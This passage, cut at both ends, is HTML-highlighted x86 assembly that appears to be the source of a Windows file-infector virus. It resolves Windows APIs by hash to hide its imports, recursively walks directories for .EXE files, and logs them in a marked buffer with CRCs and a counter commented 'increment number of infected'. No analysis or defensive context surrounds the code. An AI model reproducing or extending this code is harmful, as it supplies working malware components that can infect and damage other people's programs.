</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">260</span><span class="sc0">
</span><span class="sc5">apicall</span><span class="sc0">  </span><span class="sc2">220B36AAh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; GetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">skipinitfile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">andloadfile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; load the ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">gogetagainslash</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; Check number of \ wich is </span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc13">'\'          ; the counter of directories
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getnextslash</span><span class="sc0">                </span><span class="sc1">; level</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">getnextslash</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gogetagainslash</span><span class="sc0">             </span><span class="sc1">; untill the end</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;dec    eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; ecx is a pointer to the 0 end char</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; is the directory level</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; seek to that pointer</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; load value</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; point to the find first find next</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; save  handler, api call scratch it</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">Fapicall</span><span class="sc0"> </span><span class="sc2">0E5FAADCFh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">kk94</span><span class="sc0">      </span><span class="sc1">; Find the next file, if value </span><span class="sc0">
                    </span><span class="sc1">; scratched</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">AddOneFile</span><span class="sc0">          </span><span class="sc1">; is it working ? all right</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">Fapicall</span><span class="sc0">    </span><span class="sc2">0D15AA8A9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">kk103</span><span class="sc0">
                    </span><span class="sc1">; if we reach that point, Find Next</span><span class="sc0">
                    </span><span class="sc1">; have failed</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">goupdirnow</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ecx is a pointer to the directory</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; initing the buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc13">'*.*\'      ; set it with the zero
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; initing the buffer</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; where we drop it</span><span class="sc0">


</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">Fapicall</span><span class="sc0">    </span><span class="sc2">04A5BD785h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">kk126</span><span class="sc0">  </span><span class="sc1">; and then find the next file</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; set it with the zero</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">goupdirnow</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; load the deep counter value</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load the count value</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">reloadonefile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; find it X time</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">AddOneFile</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; then load in the FF buffer</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Fapicall</span><span class="sc0">    </span><span class="sc2">0E5FAADCFh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">kk160</span><span class="sc0">      </span><span class="sc1">; find next file</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">reloadonefile</span><span class="sc0">

</span><span class="sc5">AddOneFile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">filegoaway</span><span class="sc0">

</span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">dontgodowndir</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">loadbbeforenext</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">loadbbeforenext</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">andloadfile</span><span class="sc0">

</span><span class="sc5">dontgodowndir</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">searchagain</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">filegoaway</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">searchagain</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'EXE'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">filegoaway</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; registering the file to the file buffer</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc12">'!CeC'</span><span class="sc0">          </span><span class="sc1">; check strcutre</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skipinitfilbuff</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc12">'!CeC'</span><span class="sc0">          </span><span class="sc1">; set it</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">skipinitfilbuff</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">4999</span><span class="sc0">          </span><span class="sc1">; max number</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">skipregfile</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gotaload</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">'\'                 ; load directory
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gotaload</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; load name</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">loadthismasta</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; seek to last entered PE</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">gogotdropit</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; already registered</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skipregfile</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">getnext0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getnext0</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loadthismasta</span><span class="sc0">

</span><span class="sc5">gogotdropit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; increment number of infected</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; set crc</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; set null file state</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; load the directory</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">getnext1236</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getnext1236</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc13">'\'            ; drop it
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">getnext789b</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getnext789b</span><span class="sc0">             </span><span class="sc1">; drop name</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">skipregfile</span><span class="sc0">             </span><span class="sc1">; finish work</span><span class="sc0">

</span><span class="sc5">gotaload</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; load crc</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gotaload</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">skipregfile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">filegoaway</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; load the deep counter value</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
